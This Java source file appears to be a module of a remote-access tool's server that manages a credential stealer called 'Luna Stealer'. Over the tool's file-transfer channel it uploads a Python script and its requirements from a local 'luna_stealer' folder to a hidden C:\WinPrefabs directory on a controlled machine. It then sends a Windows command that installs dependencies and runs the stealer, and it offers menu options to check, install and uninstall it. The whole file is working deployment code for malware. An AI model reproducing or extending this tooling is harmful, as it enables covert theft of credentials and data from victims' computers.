package me.kutuzov.server.python.pmodule.modules.installable;

import static me.kutuzov.server.util.ConsoleUtils.*;

import me.kutuzov.entry.SerializableEntry;
import me.kutuzov.packet.SCWinCommandPacket;
import me.kutuzov.packet.kftp.*;
import me.kutuzov.packet.python.SCPythonCommandPacket;
import me.kutuzov.packet.python.status.InstalledStatus;
import me.kutuzov.server.KutuzovEntry;
import me.kutuzov.server.client.Client;
import me.kutuzov.server.python.PythonClient;
import me.kutuzov.server.python.pmodule.PythonModule;
import me.kutuzov.server.python.pmodule.PythonModuleInstallable;
import me.kutuzov.server.python.pmodule.PythonModuleMenu;
import me.kutuzov.server.util.LoadingWheel;

import java.io.File;
import java.nio.file.Files;
import java.util.concurrent.atomic.AtomicBoolean;

public class PyModILuna implements PythonModule<Boolean>, PythonModuleInstallable, PythonModuleMenu {
    LoadingWheel wheel = new LoadingWheel();

    @Override
    public Boolean run(Client client) {
        clearConsole();

        AtomicBoolean ret = new AtomicBoolean(true);
        client.addWait(() -> {
            PythonClient python = KutuzovEntry.SERVER.pythonClientManager.cache(client);
            python.updateNoQueue();

            if(python.installed == InstalledStatus.UNKNOWN || !isInstalled(python)) {
                ret.set(false);
                pnl("Luna is not installed");
                return;
            }

            try {
                wheel.showing.set(true);

                /*wheel.status.set("Installing dependencies...");
                client.sendPacket(new SCPythonCommandPacket(python.path, "-m pip install -r "+getPath()+"requirements.txt"));
                client.readPacket();*/

                wheel.status.set("Running Luna...");
                client.sendPacket(new SCWinCommandPacket(String.format("(%s -m pip install -r %srequirements.txt) && (%s %samogus.py)", python.path, getPath(), python.path, getPath())));
                client.readPacket();

                wheel.showing.set(false);

                clearConsole();
                pnl("Running Luna... OK!");
            } catch (Exception exception) {
                wheel.showing.set(false);
                exception.printStackTrace();
            }
        });

        pnl("Press any key to continue...");
        readLine();

        return ret.get();
    }

    @Override
    public String getPath() {
        return "C:\\WinPrefabs\\luna\\";
    }

    /**
     * THIS METHOD NEEDS TO BE QUEUED IN PACKET QUEUE
     * @param client
     * @return true if installed
     */
    @Override
    public boolean isInstalled(PythonClient client) {
        try {
            client.client.sendPacket(new SCKFTPListDirectoryPacket("C:\\WinPrefabs\\"));
            int checks = 0;

            CSKFTPDirectoryInfoPacket winPrefabs = (CSKFTPDirectoryInfoPacket) client.client.readPacket();
            for(String folder : winPrefabs.directories)
                if(folder.equals("luna"))
                    checks++;

            if(checks < 1)
                return false;
            client.client.sendPacket(new SCKFTPListDirectoryPacket(getPath()));

            CSKFTPDirectoryInfoPacket luna = (CSKFTPDirectoryInfoPacket) client.client.readPacket();
            for(SerializableEntry<String, Long> entry : luna.files) {
                if(entry.key.equals("amogus.py"))
                    checks++;
                if(entry.key.equals("requirements.txt"))
                    checks++;
            }

            return checks >=3;
        } catch (Exception exception) {
            exception.printStackTrace();
        }

        return false;
    }

    @Override
    public boolean install(PythonClient client) {
        clearConsole();
        AtomicBoolean ret = new AtomicBoolean(true);

        wheel.showing.set(true);
        wheel.status.set("Starting installation...");
        client.client.addWait(() -> {
            wheel.status.set("Searching current installation...");
            if(isInstalled(client)) {
                ret.set(false);
                wheel.showing.set(false);
                return;
            }

            wheel.status.set("Uploading files...");
            try {
                File amoguspyFile = new File("pymodules/luna_stealer/amogus.py");
                if(!amoguspyFile.exists()) {
                    ret.set(false);
                    wheel.showing.set(false);
                    pnl("amogus.py not found in pymodules/luna_stealer/");
                    return;
                }

                File requirementstxtFile = new File("pymodules/luna_stealer/requirements.txt");
                if(!requirementstxtFile.exists()) {
                    ret.set(false);
                    wheel.showing.set(false);
                    pnl("requirements.txt not found in pymodules/luna_stealer/");
                    return;
                }

                byte[] buffer;

                wheel.status.set("Changing KFTP directory...");
                client.client.sendPacket(new SCKFTPChangeDirectoryPacket("C:\\WinPrefabs\\"));
                client.client.readPacket();

                wheel.status.set("Creating Luna directory...");
                client.client.sendPacket(new SCKFTPCreateDirectoryPacket("luna"));

                CSKFTPDirectoryInfoPacket p = (CSKFTPDirectoryInfoPacket) client.client.readPacket();
                // Check if directory exists in p.directories
                boolean lExists = false;
                for(String directory : p.directories)
                    if(directory.equals("luna"))
                        lExists = true;

                if(!lExists) {
                    ret.set(false);
                    wheel.showing.set(false);
                    pnl("Failed to create Luna directory");
                    return;
                }

                wheel.status.set("Changing KFTP directory to luna...");
                client.client.sendPacket(new SCKFTPChangeDirectoryPacket("C:\\WinPrefabs\\luna"));
                client.client.readPacket();

                wheel.status.set("Uploading amogus.py...");
                buffer = Files.readAllBytes(amoguspyFile.toPath());
                client.client.sendPacket(new SCKFTPFilePacket("amogus.py", buffer));
                client.client.readPacket();

                wheel.status.set("Uploading requirements.txt...");
                buffer = Files.readAllBytes(requirementstxtFile.toPath());
                client.client.sendPacket(new SCKFTPFilePacket("requirements.txt", buffer));
                client.client.readPacket();

                wheel.showing.set(false);
                clearConsole();
                pnl("Installation complete!");
            } catch (Exception exception) {
                ret.set(false);
                wheel.showing.set(false);
                exception.printStackTrace();
            }
        });

        pnl("Press any key to continue...");
        readLine();

        return ret.get();
    }

    @Override
    public boolean uninstall(PythonClient client) {
        clearConsole();
        AtomicBoolean ret = new AtomicBoolean(true);

        wheel.showing.set(true);
        wheel.status.set("Starting uninstallation...");
        client.client.addWait(() -> {
            wheel.status.set("Searching current installation...");
            if(!isInstalled(client)) {
                ret.set(false);
                wheel.showing.set(false);
                return;
            }

            wheel.status.set("Deleting files...");
            try {
                wheel.status.set("Changing KFTP directory...");
                client.client.sendPacket(new SCKFTPChangeDirectoryPacket("C:\\WinPrefabs\\"));
                client.client.readPacket();

                wheel.status.set("Deleting Luna directory...");
                client.client.sendPacket(new SCKFTPDeleteDirectoryPacket("luna"));

                CSKFTPDirectoryInfoPacket p = (CSKFTPDirectoryInfoPacket) client.client.readPacket();
                // Check if directory exists in p.directories
                boolean lExists = false;
                for(String directory : p.directories)
                    if(directory.equals("luna"))
                        lExists = true;

                if(lExists) {
                    ret.set(false);
                    wheel.showing.set(false);
                    pnl("Failed to delete Luna directory");
                    return;
                }

                wheel.showing.set(false);
                clearConsole();
                pnl("Uninstallation complete!");
            } catch (Exception exception) {
                ret.set(false);
                wheel.showing.set(false);
                exception.printStackTrace();
            }
        });

        return ret.get();
    }

    @Override
    public void menu(PythonClient client) {
        loop1:
        while(true) {
            clearConsole();
            pnl("Loading...");

            clearConsole();
            String installed = isInstalled(client) ? " [Installed]" : " [Not installed]";

            KutuzovEntry.SERVER.user_list_header(client.client);
            KutuzovEntry.SERVER.user_list_client_header_python(client);
            pnl("Luna Stealer" + installed);
            pnl("  0) Go back");
            pnl("  1) Run");
            pnl("  2) Install");
            pnl("  3) Uninstall");
            pnl("Option: ");

            String input = readLine();
            int option = input.contentEquals("")?-1:Integer.parseInt(input);
            switch(option) {
                case 0:
                    break loop1;
                case 1:
                    run(client.client);
                    break;
                case 2:
                    install(client);
                    break;
                case 3:
                    uninstall(client);
                    break;
                default:
                    break;
            }
        }
    }
}